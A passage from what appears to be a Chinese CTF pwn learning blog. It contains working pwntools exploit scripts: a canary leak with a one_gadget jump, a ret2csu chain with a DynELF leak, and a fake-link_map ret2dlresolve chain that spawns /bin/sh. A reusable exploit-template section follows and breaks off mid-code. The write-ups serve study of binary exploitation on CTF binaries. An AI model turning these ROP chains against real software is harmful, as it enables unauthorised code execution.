class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>], arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">addr = <span class="string">&#x27;0x08048B09&#x27;</span></span>):</span></span><br><span class="line">    raw_input(<span class="string">&#x27;debug:&#x27;</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">&quot;b *&quot;</span> + addr)</span><br><span class="line"></span><br><span class="line">local_MAGIC = <span class="number">0x0003AC69</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;/home/h11p/hackme/huxiangbei/pwns&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x102</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Give me some datas:\n&#x27;</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">myCanary=io.recv()[<span class="number">268</span>:<span class="number">271</span>]</span><br><span class="line">Canary=<span class="string">&quot;\x00&quot;</span>+myCanary</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Canary:&quot;</span>+<span class="built_in">hex</span>(u32(Canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x151</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Give me some datas:\n&#x27;</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">mylibc=io.recv()[<span class="number">347</span>:<span class="number">351</span>] <span class="comment">#直接开gdb看出来的</span></span><br><span class="line">base_libc=u32(mylibc)-<span class="number">0x18637</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;mylibc_addr:&quot;</span>+<span class="built_in">hex</span>(base_libc)</span><br><span class="line"></span><br><span class="line">MAGIC_addr=local_MAGIC+base_libc <span class="comment">#这个MAGIC是one_gadget</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x101</span>+Canary+<span class="string">&quot;a&quot;</span>*<span class="number">0xc</span>+p32(MAGIC_addr) </span><br><span class="line">io.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Give me some datas:\n&#x27;</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
<p>我和他的版本不同，我打不通也看不懂，以后再学</p>
<p>地址：<a target="_blank" rel="noopener" href="http://www.javashuo.com/article/p-gbecslst-no.html">2017湖湘杯pwn100的wp - JavaShuo</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/" class="post-title-link" itemprop="url">万能pop+DynELF经典组合(附加ret2dlresolve)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-03 14:07:28" itemprop="dateCreated datePublished" datetime="2022-01-03T14:07:28+08:00">2022-01-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-04 22:34:48" itemprop="dateModified" datetime="2022-01-04T22:34:48+08:00">2022-01-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>事情的起因是我遇到了一道做过的题目，它的代码完全没有改变，只是程序变成了64位</p>
<p>以前我用DynELF直接打通了32位，现在来看64位发现少了一个gadget，于是我脑袋抽了，用“ret2dlresolve”搞了一上午</p>
<p>后来想到了利用“ret2csu”来控制DynELF中的“write”函数</p>
<p>发现这种组合的通用性还挺高，只要程序溢出至少“136字节”就可以打</p>
<p>于是想记录一下，让今后的我少走点弯路</p>
<hr>
<p><strong>2015-xdctf-pwn200</strong></p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183143407.png" alt="1641183143407"> </p>
<p>一次输入</p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183182063.png" alt="1641183182063"> </p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183191422.png" alt="1641183191422"> </p>
<p>64位，dynamically，开了NX</p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183209046.png" alt="1641183209046"> </p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183233342.png" alt="1641183233342"> </p>
<p>没有system，没有“/bin/sh”</p>
<p>函数write可以输出的值就是字符串的长度“23字节”</p>
<p>vuln中有read，可以输入“256字节”</p>
<p><strong>入侵思路</strong></p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183449006.png" alt="1641183449006"> </p>
<p>程序溢出了“144字节”，有write函数，可以有多种方法打通</p>
<p><strong>DynELF</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x40066E</span></span><br><span class="line">fun_addr=<span class="number">0x400637</span> </span><br><span class="line">bss_addr=<span class="number">0x601050</span>+<span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x000000000400780</span></span><br><span class="line">csu_end_addr=<span class="number">0x00000000040079A</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_got &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(write_got))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx) + p64(rbp)+p64(r12) +p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">	csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, addr, <span class="number">8</span>, main_addr)</span><br><span class="line">	data=p.recv(<span class="number">8</span>)</span><br><span class="line">	log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (addr, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))) </span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">		</span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line"></span><br><span class="line">execve_addr=d.lookup(<span class="string">&#x27;execve&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;execve_addr: &quot;</span>+<span class="built_in">hex</span>(execve_addr))</span><br><span class="line"></span><br><span class="line">payload=p64(execve_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_addr, <span class="built_in">len</span>(payload), main_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, bss_addr+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>注意：</strong>(每一条都是血的教训)</p>
<p>因为DynELF模块在执行的过程中会输出一下字符串，所以“p.recvuntil”必须有</p>
<p>不同程序的csu可能不同，有时需要修改模板</p>
<p>另外我也尝试过用“system”但是打不通（可能是环境问题）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, addr, <span class="number">8</span>, main_addr)</span><br></pre></td></tr></table></figure>
<p>用csu包装的函数视乎只认识GOT表，用其他的就报错</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(execve_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_addr, <span class="built_in">len</span>(payload), main_addr)</span><br><span class="line"><span class="comment">#read(0, bss_addr, len(payload))</span></span><br><span class="line">p.send(payload)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, bss_addr+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line"><span class="comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span></span><br></pre></td></tr></table></figure>
<p>必须利用“read”把泄露出来的“execve”写在某个地址上，只有这样才可以调用“execve”</p>
<p>​        //我也尝试过用其他姿势来调用“execve”，但是都报错了</p>
<hr>
<p><strong>ret2dlresolve</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>) <span class="comment">#程序使用这个库文件</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">bss = <span class="number">0x601050</span>  </span><br><span class="line">bss_stage = bss + <span class="number">0x100</span></span><br><span class="line">l_addr =  libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line"><span class="comment">#目标函数和已知函数的偏移（把‘write’重定位成‘system’）</span></span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span>  </span><br><span class="line">pop_rsi = <span class="number">0x4007a1</span> </span><br><span class="line">plt_load = <span class="number">0x400506</span> <span class="comment">#plt[1](dl_runtime_resolve)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span></span><br><span class="line">    <span class="comment">#offset为负数，可以用‘(2 ** 64 - 1)’来控制范围 </span></span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">0</span>) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) </span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>) </span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>) </span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>) </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, write_got ,l_addr)</span><br><span class="line">payload = flat( <span class="string">&#x27;a&#x27;</span> * <span class="number">120</span> ,pop_rdi, <span class="number">0</span> , pop_rsi , bss_stage , <span class="number">0</span> , read_plt , pop_rsi , <span class="number">0</span> ,<span class="number">0</span> , pop_rdi , bss_stage + <span class="number">0x48</span>  , plt_load , bss_stage , <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">read_plt触发时输入‘fake_link_map’，plt_load就是dl_runtime_resolve，控制程序手段执行dl_runtime_resolve，此时‘bss_stage’被当做第一个参数，‘0’被当做第二个参数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)  </span><br><span class="line">r.sendline(payload)  </span><br><span class="line"></span><br><span class="line">r.send(fake_link_map) <span class="comment">#把write重定位为system</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>可以来看一下fake_Linkmap_payload的栈帧:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>| fake_linkmap_addr+<span class="number">0x00</span>  --&gt; offset <span class="comment">//DT_STRTAB（随便设置的）</span></span><br><span class="line"><span class="number">0008</span>| fake_linkmap_addr+<span class="number">0x08</span>  --&gt; <span class="number">0</span>	<span class="comment">//DT_JMPREL</span></span><br><span class="line"><span class="number">0010</span>| fake_linkmap_addr+<span class="number">0x10</span>  --&gt; fake_linkmap_addr + <span class="number">0x18</span> </span><br><span class="line"><span class="number">0018</span>| fake_linkmap_addr+<span class="number">0x18</span>  --&gt; fake_linkmap_addr + <span class="number">0x30</span> - offset </span><br><span class="line"><span class="number">0020</span>| fake_linkmap_addr+<span class="number">0x20</span>  --&gt; <span class="number">0x7</span></span><br><span class="line"><span class="number">0028</span>| fake_linkmap_addr+<span class="number">0x28</span>  --&gt; <span class="number">0</span> </span><br><span class="line"><span class="number">0030</span>| fake_linkmap_addr+<span class="number">0x30</span>  --&gt; <span class="number">0</span> </span><br><span class="line"><span class="number">0038</span>| fake_linkmap_addr+<span class="number">0x38</span>  --&gt; <span class="number">0</span> <span class="comment">//DT_SYMTAB</span></span><br><span class="line"><span class="number">0040</span>| fake_linkmap_addr+<span class="number">0x40</span>  --&gt; known_func_ptr - <span class="number">0x8</span> </span><br><span class="line"><span class="number">0048</span>| fake_linkmap_addr+<span class="number">0x48</span>  --&gt; b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span></span><br><span class="line">.................................... </span><br><span class="line"><span class="number">0068</span>| fake_linkmap_addr+<span class="number">0x68</span>  --&gt; fake_linkmap_addr </span><br><span class="line">    <span class="comment">//对应的值是DT_STRTAB的地址(fake_linkmap_addr)</span></span><br><span class="line"><span class="number">0070</span>| fake_linkmap_addr+<span class="number">0x70</span>  --&gt; fake_linkmap_addr + <span class="number">0x38</span> </span><br><span class="line">    <span class="comment">//对应的值是DT_SYMTAB的地址(fake_linkmap_addr + 0x38)</span></span><br><span class="line">.................................... </span><br><span class="line"><span class="number">00f</span>8| fake_linkmap_addr+<span class="number">0xf8</span>  --&gt; fake_linkmap_addr + <span class="number">0x8</span>   </span><br><span class="line">    <span class="comment">//对应的值是DT_JMPREL的地址(fake_linkmap_addr + 0x8)</span></span><br></pre></td></tr></table></figure>
<p><strong>dl_runtime_resolve</strong>被手动调用时，会读取“bss_stage”上的数据为“link_map”然后获取“JMPREL”，“SYMTAB”，“DT_STRTAB”，问题的关键就在于把它们三个的 <strong>“索引”</strong> 都弄成“0”，才能进行伪装</p>
<p>这种伪装方式不需要“JMPREL”，“SYMTAB”，“DT_STRTAB”的地址，只要一个已知函数的GOT表地址，和libc版本就可以了</p>
<hr>
<p><strong>注意：</strong></p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641234781843.png" alt="1641234781843"> </p>
<p>重定位入口的符号类型（一般为“0x7”）在“JMPREL”中看</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/" class="post-title-link" itemprop="url">各种模板</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-02 22:35:12" itemprop="dateCreated datePublished" datetime="2022-01-02T22:35:12+08:00">2022-01-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-03 17:30:18" itemprop="dateModified" datetime="2022-04-03T17:30:18+08:00">2022-04-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="各种模板"><a href="#各种模板" class="headerlink" title="各种模板"></a>各种模板</h2><p>pwn题中有许多目标模板，灵活利用可以节约大量时间</p>
<p>我打算把我遇到的所有模板都挂在这里，方便以后查找</p>
<hr>
<h2 id="CSU-万能pop模板"><a href="#CSU-万能pop模板" class="headerlink" title="CSU-万能pop模板"></a>CSU-万能pop模板</h2><p>当程序的常规gadgets不能满足需求时（通常是缺少“pop_rdx”），就需要万能pop</p>
<p>如果用<strong>csu</strong>进行寄存器赋值，需要两个重要的ROPgadgets：</p>
<p>csu_front_addr：</p>
<img src="/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126255915-1642995722008-1647496563602.png" class width="1641126255915"> 
<p> csu_end_addr：</p>
<img src="/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126386447-1642995722010-1647496563602.png" class width="1641126386447"> 
<p>这两个gadgets相互配合就可以执行任何已知函数</p>
<p>不同的程序csu可能不同（寄存器顺序不同），一定要确认并修改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr=</span><br><span class="line">csu_end_addr=</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call(只能是got表地址)</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    <span class="comment"># csu(0, 1, fun_got, rdx, rsi, rdi, last)</span></span><br><span class="line">    payload = padding + fake_ebp</span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    p.send(payload)</span><br></pre></td></tr></table></figure>
<p>​        // fun_got也可以是指向函数首地址的指针</p>
<p>例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, bss_addr, <span class="number">1</span>, main_addr)</span><br><span class="line"><span class="comment">#执行write(1,bss_addr,8)后，执行main_addr</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">8</span>, bss_addr, <span class="number">0</span>, main_addr)	</span><br><span class="line"><span class="comment">#执行read(0,bss_addr,8)后，执行main_addr</span></span><br></pre></td></tr></table></figure>
<p>​        //但是万能pop需要至少“136字节”（0x88）的溢出</p>
<h2 id="DynELF-基于puts的模板"><a href="#DynELF-基于puts的模板" class="headerlink" title="DynELF-基于puts的模板"></a>DynELF-基于puts的模板</h2><p>puts遇到“\x00”会中断，并且会在字符串结尾自动加上’\n’，非常不适合leak函数</p>
<p>所以想用puts来泄露地址，必须要对其进行处理：</p>
<p>64位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span> </span><br><span class="line">    payload = padding + fake_rbp</span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(addr) </span><br><span class="line">    payload += p64(puts_plt) + p64(ret_address)</span><br><span class="line">    p.send(payload) </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">    count = 